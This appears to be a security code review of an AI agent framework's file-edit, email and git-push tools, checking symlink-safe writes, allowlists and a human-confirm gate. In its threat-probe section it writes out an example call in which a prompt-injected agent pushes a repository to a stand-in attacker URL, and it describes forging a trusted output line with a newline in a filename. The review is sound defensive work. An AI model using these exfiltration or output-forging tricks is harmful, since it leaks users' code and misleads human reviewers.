---
task_id: P4.2-B5
stage: R0-A-on-impl
lens: single (requires_cross_family_review=false, architect-ratified; NO R0-B — I carry the adversarial weight alone)
reviewer: architect-partner
date: 2026-06-05
verdict: needs_architect
summary: >
  The impl FAITHFULLY ships ADR-036 (Accepted): apply_edit / send_email / git_push wired
  through the existing ADR-030 confirm path, executor byte-unchanged (4th time). The pinned
  Y1 write-recipe is airtight and impl+t11 AGREE (O_NOFOLLOW on the temp create, no plain
  open(dest,'w')). All gates green (ruff + mypy --strict 244 files + 192 tools tests incl.
  t1-t12). needs_architect is for ROUTING ONE threat-probe finding — N1: git_push's `remote`
  param accepts an arbitrary URL/path (only flag-shape rejected), an exfil-by-remote vector
  parallel to send_email's INSCRIBED exfil-by-recipient but NOT named in ADR-036 D3-iii.
  NOT an impl defect (impl matches the ADR's stated constraint); mitigated by HARD-tier
  confirm. M-2 (apply_edit trusted-output echo) confirmed reachable, remains forward-watch.
---

# R0-A on impl — P4.2-B5 (mutation local tools)

**Method.** Verify-cite against the Accepted ADR-036 + the constitution, over
`origin/claude/P4.2-B5-impl @ 6f56a92` (all 6 atomics; HEAD == origin, 0/0). Gates run
locally. Single-lens: I carry the impl-stage adversarial weight alone, so §3 is the sharp
probe. **State-machine note (transparency, not a halt):** the committed state is
`awaiting_junior_impl`, the working tree advanced to `awaiting_senior_plan_vs_impl`
(post-commit-hook). The architect dispatched R0-A explicitly + directly; R0-A is mandatory
regardless of plan-vs-impl (ADR-008 Amendment 1). I proceed as dispatched and do NOT touch
the state file. (`ui/*` divergence vs main is disjoint noise, ignored per dispatch.)

---

## 1. Faithfulness to ADR-036 (Accepted) — the carry-forwards + the pins

**Y1 (the pinned apply_edit write-recipe) — RESOLVED, airtight, impl + t11 AGREE.** This was
the single sharpest plan-stage carry. The impl is ONE coherent strategy, exactly as pinned:
- Bounded content BEFORE any write (`mutation_tools.py:89-95`, `MAX_RESULT_BYTES` on input). ✓
- Check-time containment via `_check_path` (`mutation_tools.py:100` → `local.py:120-135`):
  `(root/path).resolve().relative_to(root)` — `.resolve()` follows ALL symlinks, so an
  **existing escaping final-component symlink is REFUSED at check** (not skipped). ✓
- `O_NOFOLLOW` is on the **TEMP CREATE**, never the destination: `flags |= os.O_NOFOLLOW`
  (`:122-123`) → `os.open(tmp_name, flags, 0o600)` (`:124`), with `O_CREAT|O_EXCL` so a
  pre-planted temp (the unlink→open window) fails closed. `os.replace(tmp_name, dest)`
  (`:134`) is the atomic commit — it **replaces** an in-sandbox final symlink entry (does
  not write THROUGH it), and any escaping one was already refused at check. The destination
  is **never opened for write**. ✓
- Mid-write failure leaves the original intact (`finally` temp cleanup `:141-145`; `os.replace`
  atomicity). ✓
- **t11 matches the chosen strategy** (`test_constitution.py:990-1048`): the AST guard accepts
  the dynamic-flag build (`O_NOFOLLOW` + `os.open` both present, `:1011-1013`) AND bans a plain
  `open(dest,'w')` (`:1022-1048`) — which the impl never does (it uses `os.open`/`os.replace`).
  Behavioral t11 (`:942-983`) exercises traversal-refuse, existing-escaping-symlink-refuse,
  oversize-refuse, and mid-write-no-partial. The Y1 worry ("impl + t11 must agree on WHERE
  O_NOFOLLOW lives") is closed: both put it on the temp create. ✓
  Unit coverage corroborates (`test_mutation_tools.py:108-145` containment incl. parent- and
  final-symlink escape; `:153-158` oversize; `:183-219` atomic new + overwrite).

**git_push — faithful (one residual to route, §3 N1).** Fixed argv `["git","push",remote,branch]`
(`subprocess_tools.py:284`); flag-shaped remote/branch refused (`:265-274`); the five
destructive flags banned as a set (`:50-52`) + in-value check (`:277-281`); `t12`
(`test_constitution.py:1056-1108`) AST-asserts the banned set + behaviorally refuses flag-shaped
remote/branch; `t9` (`:477-550`) covers argv-never-shell FREE (git_push lives in
`subprocess_tools.py`). SSH_AUTH_SOCK is a NAMED non-secret overlay: only that key, only when
present (`:43-47, 286-289`), via `scoped_env(extra_env=…)` with **no `api_key_env`**
(`:112`) → no secret value injected; real secrets stay stripped (verified mechanism, R0-A-on-plan
§1 D3). Tests prove overlay-present + no-injection-when-absent (`test_subprocess_tools.py:363-437`)
and a REAL push to a non-named local-path remote (`:333-360`). Remote output is UNTRUSTED:
`git_push ∈ _SUBPROCESS_TOOL_NAMES` (`selection.py:102`), excerpt-excluded (`:121-149`; behavioral
`test_subprocess_tools.py:440-479`). ✓

**send_email — faithful, clean.** Param allowlist `{to,subject,body}` (`network_tools.py:290`) →
the endpoint is operator-config, NOT agent-redirectable → **SSRF N/A** (plain `httpx.Client`,
`:366-367`). Fail-closed unconfigured provider (`:322-325`) AND unconfigured allowlist
(`:328-332`, mandatory). Recipient allowlist enforced BEFORE the POST (`:334-351`); the domain
match is exact-or-dotted-suffix (`:341-344`) — no `evilcompany.com`⊃`company.com` confusion. Key
ONLY in the `Authorization` header (`:361-364`), absent from payload + result (`:355-360, 378-386`);
`test_send_email_key_in_header_only` asserts all three (`test_network_tools.py:504-513`).
`send_email ∈ _NETWORK_TOOL_NAMES` (`selection.py:116`) → untrusted/excerpt-excluded. The
exfil-by-recipient residual is the inscribed honest residual (ADR-036 D3-ii). ✓
`config/email.yaml.example` documents the shape + SSRF-N/A + the residual.

**Confirm-actuation (D2) — faithful; executor tier- & tool-AGNOSTIC; NO mutation special-case.**
The end-to-end e2e is the proof (`test_e2e.py:321-413`): a `TOOL_CALL_PENDING` for apply_edit →
`POST /confirm approve` → `TOOL_RESULT` "wrote N bytes" + file-on-disk + NOT "not_implemented".
B5 added only impls + registry entries — `executor.py` is **byte-unchanged** (empty diff vs
merge-base), so the empty-executor-diff holds the **4th time**; `t3b` re-guards it
(`test_constitution.py:190-231`). Caps stay in the loop by marker (git_push→`_SubprocessToolFn`,
send_email→`_NetworkToolFn`, apply_edit→no marker, plain branch). The AUTO-under-intent edge is
neither special-cased nor floored (no executor override added). ✓

**No new `LLMPurpose`; t1/t2/t3/t4/t6/t8 hold.** All 192 `tests/tools` pass incl. t1-t12 +
b35/b46 drift + b55 free-coverage. t6/t8 scan only `local.py` (untouched — apply_edit lives in
`mutation_tools.py`), so they stay pristine (ADR-036 D4). `mutation_tools.py` references no
`LLMPurpose` (b55, `test_constitution.py:1138-1141`). ✓

**ADR-028 D3 amendment + ADR-030/034/035 cross-refs — inscribed, match Accepted.** ADR-028 status
line + D3 deferred-list strike the three mutation tools (propose_edit stays deferred); the local
trust-boundary para now admits write via apply_edit. ADR-030/034/035 each carry a
`[Cross-ref P4.2-B5 → ADR-036, Accepted 2026-06-05]` line. All four stamp "Accepted 2026-06-05",
consistent with ADR-036's status. ✓ (Trivial nit, non-blocking: the ADR-028 D3 strike-through has
some stray nested backticks around the struck tool names — cosmetic render only, semantics correct.)

**Gates green.** `ruff` clean; `mypy --strict` (canonical `files=["src","tests"]`) Success, 244
files; `pytest tests/tools` 192 passed.

---

## 2. The pinned watch-items from R0-A-on-plan — dispositions

- **Y1 (write-recipe coherence + t11 invariant):** RESOLVED (§1). The probe landed with the
  strategy pinned; impl + t11 agree.
- **M-2 (apply_edit trusted-output echo):** CONFIRMED REACHABLE, remains FORWARD-WATCH (not a
  blocker, per ADR-036 M-2). apply_edit returns `wrote N bytes to <rel>` (`mutation_tools.py:147-149`)
  as TRUSTED output (no name-set membership) → rendered raw into `_render_snapshot_excerpt`
  (`selection.py:152-195`). `<rel>` is agent-influenced and `_check_path` does NOT strip newlines
  (Linux filenames admit `\n`), so a crafted path CAN forge an excerpt line. This is exactly the
  inscribed forward-watch: NOT B5-introduced (`log_event` already echoes agent content,
  `local.py` precedent), and a single excerpt-render newline-sanitization covers both. No B5
  action; flagged so the architect can schedule the sanitization slice.

---

## 3. Threat-probe — the single-lens carry (ONE finding to route)

**N1 (🟡 — honest-residual completeness; architect routes; NOT an impl defect).**
`git_push`'s `remote` param accepts an **arbitrary URL or path** — the impl validates only
flag-shape (`subprocess_tools.py:243` default "origin"; `:265-266` rejects leading "-") and
banned-flag-equality (`:277-281`); it does **not** constrain `remote` to a named/known remote.
`git push <repository> <branch>` accepts a URL as `<repository>`, and the happy-path test itself
pushes to a non-named local-path remote (`test_subprocess_tools.py:359`), so this generalizes: a
prompt-injected agent can propose `git_push(remote="https://attacker.example/r.git", branch=…)` and,
where that remote accepts the push (anonymous, or ambient creds happen to authenticate), the
**repository contents are exfiltrated**. This is structurally the SAME class as `send_email`'s
exfil-by-recipient — egress to an agent-chosen destination — which ADR-036 **D3-ii inscribes as an
honest residual** (bounded by the domain allowlist). But **ADR-036 D3-iii frames git_push's residual
ONLY as "ambient-auth-only + the SSH_AUTH_SOCK passthrough"** and is silent on arbitrary-remote
egress. The impl is **faithful** to the ADR's stated constraint ("constrained params … never
flag-shaped", D3-iii) — so this is an ADR inscription/scope question, not a junior deviation.

- **Mitigation already in place:** git_push is rev 1 → **HARD everywhere** (ADR-036 D1, verified
  across all 6 agent configs) → it is **always human-confirmed**; the confirm payload surfaces the
  `remote`, so a human reviews the destination. This is a STRONGER control than send_email (which
  can reach AUTO under explicit intent, no human) — which is plausibly WHY the ADR judged it covered.
- **Why I still surface it:** the project's honest-residual discipline (P4-roadmap §10) names
  residuals rather than leaving them implicit; an un-named exfil vector that is explicitly named for
  its sibling tool is exactly what the sole adversarial lens exists to catch.
- **Routing options (your call — I do not decide):**
  (α) **inscribe** a one-line named residual in ADR-036 D3-iii ("git_push exfil-by-remote, bounded
  by the always-HARD confirm gate") for symmetry with D3-ii — no impl change;
  (β) **constrain** `remote` to an operator-allowlist / named-remotes-only — an impl + test change
  (tightens egress, costs flexibility);
  (γ) **ratify as covered** by the HARD-confirm gate, no inscription.
  **My lean: α** — the impl is correct and the HARD gate is the real mitigation, so no code change is
  warranted; a one-line residual restores symmetry with send_email and keeps the honest-residual
  ledger complete. You route.

No other findings. apply_edit containment (traversal / absolute / parent-symlink / final-symlink /
oversize / atomic) is airtight against B5's in-tool model; the parent-component TOCTOU is correctly
the named `RB-FS` residual (no symlink-creation primitive in the B5 surface). send_email and the
confirm path are clean.

---

## 4. Verdict

**needs_architect** — for ROUTING N1 (the git_push exfil-by-remote inscription question) only. The
implementation is **sound and faithful**: every ADR-036 decision + constitutional carry-forward is
implemented as Accepted, the pinned Y1 write-recipe is airtight with impl+t11 in agreement, the
confirm path actuates end-to-end with a byte-unchanged executor, and all gates are green. **No
blocking defect; no impl rework required for N1 under lean α** (inscription-only). M-2 stays
forward-watch.

**Expected next architect action:** route N1 (α inscribe / β constrain / γ ratify) → if α/γ, B5 is
accept-ready and P4.2 closes; if β, a small git_push + test follow-up. The senior plan-vs-impl (state
`awaiting_senior_plan_vs_impl`) is the remaining cycle artifact.
